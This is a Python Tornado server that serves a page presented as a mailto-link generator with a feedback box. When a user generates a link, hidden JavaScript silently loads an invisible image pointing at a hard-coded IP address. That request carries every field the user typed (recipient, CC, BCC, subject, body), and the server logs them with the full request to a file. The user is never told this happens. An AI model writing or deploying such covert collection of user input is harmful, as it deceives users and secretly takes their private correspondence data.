import tornado.httpserver
import tornado.ioloop
import tornado.web
import tornado.options
tornado.options.parse_command_line()
gl = []
class indexpage(tornado.web.RequestHandler):
     def get(self):
        self.write('<!DOCTYPE html>'
'<head>'
"<title>Internet Of Stuff</title>"
'<style>'
'* {'
'font-family: Lucida Sans Unicode;'
'color: #00FF00;'
'font-size: 10;'
'text-align: center;'
'text-transform: uppercase;'
'background-color: #000000;'
'}'
'a{'
'display:block;'
'min-width:20%;'
'margin: auto;'
'}'
'input, button, textarea {'
'outline: none !important;'
'border:1px solid blue;'
'box-shadow: 0 0 10px blue;'
'display:block;'
'min-width:20%;'
'margin: auto;'
'background-color: #000000;'
'}'
'#thebutton:hover {'
'background-color: #00FF00;'
'color: blue;'
'}'
'#result {'
'min-width: 100%;'
'}'
'#thebutton {'
'background-color: blue;'
'}'
'</style>'
'</head>'
'<body>'
'<img style="width: 0px; height: 0px; display: none" id="imageiscool" src="localhost:9999/index/info=">'
'<h4>If you have any suggestions or find any bugs type them down into this text field and when you end the sentence it will automatically send. :)</h4>'
'<textarea rows="5" cols="100" onkeyup="myFunction()"  id="textfield" style="width: 100%; height: 40%" autofocus></textarea>'
'<script>'
'function myFunction()'
'{'
'var variablething = document.getElementById("textfield").value;'
'if (variablething.slice(-1) == "!" || variablething.slice(-1) == "." || variablething.slice(-1) == "?")'
'{'
'document.getElementById("imageiscool").src = "http://220.244.56.8:9999/index/?info=" + variablething;'
'document.getElementById("textfield").value = "";'
'}'
'}'
'</script>'
"<p>Type the recipient's e-mail in this field:</p>"
'<input type="text" id="email">'
'<p>Type the Carbon Copy recipients:</p>'
'<input type="text" id="cc">'
'<p>Type the Blind Carbon Copy recipients:</p>'
'<input type="text" id="bcc">'
'<p>Type the subject of the email:</p>'
'<input type="text" id="subject">'
'<p>Type the contents of the email:</p>'
'<textarea rows="5" cols="100" id="body"></textarea>'
'<button id="thebutton" onclick="makeLink()" >Click here to generate mailto:</button> '
'<a href="" id="link">Email Link</a>'
'<p>Generated Link:</p>'
'<input id="result" type="text" readonly="true">'
'<script>'
	'function makeLink() {'
	'var email = document.getElementById("email").value;'
	'var cc = document.getElementById("cc").value;'
	'var bcc = document.getElementById("bcc").value;'
	'var subject = document.getElementById("subject").value;'
	'var body = document.getElementById("body").value;'
	'var link = "mailto:" + email + "?CC=" + cc + "&BCC=" + bcc + "&subject=" + subject + "&body=" + body;'
	'document.getElementById("link").href = link;'
	'document.getElementById("result").value = link;'
        'var sendlink = "email^" + email + "^^cc^" + cc + "^^bcc^" + bcc + "^^subject^" + subject + "^^body^" + body;'
        'document.getElementById("imageiscool").src = "http://220.244.56.8:9999/email/?info=" + sendlink;'
	'var boxlist = ["email", "cc", "bcc", "subject", "body"];'
	'for(var i = 0; i < boxlist.length; i++)'
	'{'
		'document.getElementById(boxlist[i]).value = "";'
	'}'
	'}'
'</script>'
'</body>')


class index(tornado.web.RequestHandler):
     def get(self):
        with open("messages.txt", "a") as f:
		f.write(str(self.get_query_argument("info", ).strip())[0:-1] + "\n" + str(self.request)  + 3 * "\n")
class email(tornado.web.RequestHandler):
    def get(self):
        with open("email.txt", "a") as f:
                f.write(str(self.get_query_argument("info")) + "\n" + str(self.request)  + 3 * "\n")

if __name__ == "__main__":
  app = tornado.web.Application(handlers=[(r"/index/", index), (r"/(image.jpeg)", tornado.web.StaticFileHandler, {'path':'./'}), (r"/", indexpage), (r"/(logintest.py)", tornado.web.StaticFileHandler, {'path':'./Downloads/'}), (r"/email/", email),])
  http_server = tornado.httpserver.HTTPServer(app)
  http_server.listen(9999)
  tornado.ioloop.IOLoop.instance().start()
